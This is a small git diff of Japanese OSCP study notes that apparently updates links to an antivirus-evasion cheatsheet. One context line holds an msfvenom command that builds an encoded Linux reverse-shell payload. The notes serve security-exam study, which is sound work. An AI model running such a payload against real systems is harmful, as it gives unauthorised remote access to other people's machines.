@@ -1,5 +1,5 @@
 - 関連ノート：
-	- [Antivirus Evasion](../Cheatsheet/AV%20Evasion/Antivirus%20Evasion.md#Veil-frameworkを使ったAV%20evasion)
+	- [AV Evasionのテクニック](../Cheatsheet/Evasion(OSCP+試験範囲外)/AV%20Evasionのテクニック.md)
 
 ---
 
@@ -59,8 +59,6 @@ sudo msfvenom -p linux/x86/shell/reverse_tcp -f c -e x86/shikata_ga_nai -o shell
 ---
 
 # ペイロードについて
-
-- [AV Evasionのテクニック](../Cheatsheet/Evasion(OSCP+試験範囲外)/AV%20Evasionのテクニック.md)
 
 ペイロードの命名規則
 ```zsh
